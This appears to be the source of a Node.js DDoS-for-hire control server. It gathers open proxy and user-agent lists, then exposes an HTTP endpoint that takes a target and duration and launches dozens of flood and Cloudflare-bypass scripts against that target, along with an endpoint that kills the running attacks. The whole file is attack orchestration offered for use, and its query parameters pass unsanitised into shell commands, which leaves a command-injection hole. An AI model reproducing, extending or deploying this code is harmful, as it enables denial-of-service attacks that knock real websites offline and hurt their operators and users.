const express = require('express');
const { exec, execSync } = require('child_process');
const fs = require('fs');
const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

const proxyUrls = [
  "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
  "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/https.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
  "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
  "https://multiproxy.org/txt_all/proxy.txt",
  "https://rootjazz.com/proxies/proxies.txt",
  "https://api.openproxylist.xyz/http.txt",
  "https://api.openproxylist.xyz/https.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
  "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
  "https://spys.me/proxy.txt"
];

async function scrapeProxy() {
  try {
    let allData = "";

    for (const url of proxyUrls) {
      try {
        const response = await fetch(url);
        const data = await response.text();
        allData += data + "\n";
      } catch (err) {
        console.log(`❌ Failed to fetch from ${url}: ${err.message}`);
      }
    }

    fs.writeFileSync("proxy.txt", allData, "utf-8");
    console.log("All proxies successfully saved to proxy.txt");
  } catch (error) {
    console.error(`Error: ${error.message}`);
  }
}

async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}

async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`Copy: http://${data.origin}:${port}`);
  return data;
}

// Function to stop all running attacks
function stopAllAttacks() {
  try {
    // Kill all node processes that might be running attack scripts
    const processes = execSync('ps aux | grep -E "(node.*methods|H2CA\.js|HDRH2\.js|H2F3\.js|BLAST\.js|HTTP\.js|HTTPS\.js|HTTPX\.js|MIXMAX\.js|TLS\.js|R2\.js|RAND\.js|pidoras\.js|floods\.js|browser\.js|Cloudflare\.js|CFBypass\.js|bypassv1|hyper\.js|novaria\.js|CBROWSER\.js|H2GEC\.js|FLUTRA\.js|TLS-LOST\.js|TLS-BYPASS\.js|tls\.vip|HTTP-RAW\.js)" | grep -v grep | awk "{print $2}"').toString().trim();
    
    if (processes) {
      const pids = processes.split('\n').filter(pid => pid.trim());
      pids.forEach(pid => {
        try {
          execSync(`kill -9 ${pid}`);
        } catch (e) {
          console.log(`Failed to kill process ${pid}: ${e.message}`);
        }
      });
      return pids.length;
    }
    return 0;
  } catch (error) {
    console.error(`Error stopping attacks: ${error.message}`);
    return 0;
  }
}

app.get('/RainBot', (req, res) => {
  const { target, time, methods } = req.query;

  res.status(200).json({
    message: 'API request received. Executing script shortly, By Xxx',
    target,
    time,
    methods
  });

  if (methods === 'HTTP-SICARIO') {
    exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'RAW-HTTP') {
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/MIXMAX.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'R9') {
    exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'PRIV-TOR') {
    exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'HOLD-PANEL') {
    exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/floods.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/browser.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/Cloudflare.js ${target} ${time} 100`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTP-RAW.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === 'R1') {
       exec(`node methods/cf.js ${target} ${time} 50 20`);
      exec(`node methods/h2blast.js ${target} ${time} 19 8 proxy.txt`);
      exec(`node methods/Gravitus.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`);
      exec(`node methods/h2-nust ${target} ${time} 15 9 proxy.txt`);
      exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
      exec(`node methods/uam.js ${target} ${time} 5 4 6`);
      exec(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
      exec(`node methods/browserb.js ${target} ${time} 5 4 6 proxy.txt`);
      exec(`node methods/Cloudflare.js ${target} ${time} 19`);
      exec(`node methods/rawcaptcha.js ${target} ${time} 5 5 6`);
      exec(`node methods/h2k.js GET ${target} ${time} 16 90 proxy.txt --randpath 1 --debug --cache --cookie "uh=good" --delay 1 --referer rand --postdata "user=f&pass=%RAND%" --authorization Bearer:abc123 --randrate --full --fakebot true --auth`);
      exec(`node methods/cibi.js ${target} ${time} 16 9 proxy.txt`);
      exec(`node methods/CBROWSER.js ${target} ${time} 100 10 proxy.txt`);
      exec(`node methods/kicker.js GET ${target} ${time} 10 100 proxy.txt`);
      exec(`node methods/tls.js ${target} ${time} 19 90 proxy.txt`);
      exec(`node methods/cfkill.js GET ${target} ${time} 10 100 proxy.txt`);
      exec(`node methods/cfbypass.js GET ${target} ${time} 10 100 proxy.txt`);
      exec(`node methods/h2sz.js ${target} ${time} 10 15 proxy.txt`);
      exec(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
      exec(`node methods/hh2.js ${target} ${time} 10 15 proxy.txt`);
      exec(`node methods/ball.js ${target} ${time} 8 19 proxy.txt`);
      exec(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
      exec(`node methods/bypasssaturn.js ${target} ${time} 8 14 proxy.txt`);
      exec(`node methods/browser.js ${target} ${time} 100 10 proxy.txt`);
      exec(`node methods/rapidcf.js mode ${time} 20 proxy.txt 9 ${target}`);
      exec(`node methods/rapidcf.js ${time} 20 proxy.txt 9 ${target}`);
      exec(`node methods/HDRH2.js ${target} ${time} 10 100 true`);
      exec(`node methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
      exec(`node methods/HTTP-X.js ${target} ${time} 32 8 proxy.txt`);
      exec(`node methods/novaria.js ${target} ${time} 32 10 proxy.txt`);
      exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
      exec(`node methods/JSX.js ${target} ${time} 100 10 proxy.txt`);
      exec(`node methods/tls2.js ${target} ${time} 100 10 proxy.txt`);
      exec(`node methods/nflood.js ${target} ${time} 100 proxy.txt 32 bypass`);
      exec(`node methods/nflood.js ${target} ${time} 100 proxy.txt 32 flood`);
      exec(`node methods/cfb2.js ${target} ${time} 100`);
      exec(`node methods/am.js ${target} ${time} 17 100 4`);
          exec(`node ./methods/novaria.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/floods.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/browser.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/CBROWSER.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/H2GEC.js ${target} ${time} 100 10 3 proxy.txt`);
    exec(`node ./methods/HTTP.js ${target} ${time}`);
    exec(`node ./methods/FLUTRA.js ${target} ${time}`);
    exec(`node ./methods/Cloudflare.js ${target} ${time} 100`);
    exec(`node ./methods/CFbypass.js ${target} ${time}`);
    exec(`node ./methods/bypassv1 ${target} proxy.txt ${time} 100 10`);
    exec(`node ./methods/hyper.js ${target} ${time} 100`);
    exec(`node ./methods/RAND.js ${target} ${time}`);
    exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/TLS-LOST.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/TLS-BYPASS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/tls.vip ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPS.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node methods/flah.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node methods/flah.js ${target} ${time} 100 10 proxy.txt`);
      exec(`node methods/batam.js ${target} ${time} proxy.txt 32 12`);
  } else {
    console.log('Method not recognized or incorrect format.');
  }
});

// New /stopall endpoint
app.get('/stopall', (req, res) => {
  try {
    const stoppedCount = stopAllAttacks();
    res.status(200).json({
      message: 'All attacks stopped successfully',
      stoppedProcesses: stoppedCount,
      status: 'success'
    });
  } catch (error) {
    res.status(500).json({
      message: 'Failed to stop attacks',
      error: error.message,
      status: 'error'
    });
  }
});

app.listen(port, () => {
  scrapeProxy();
  scrapeUserAgent();
  fetchData();
  console.log(`Server running on port ${port}`);
});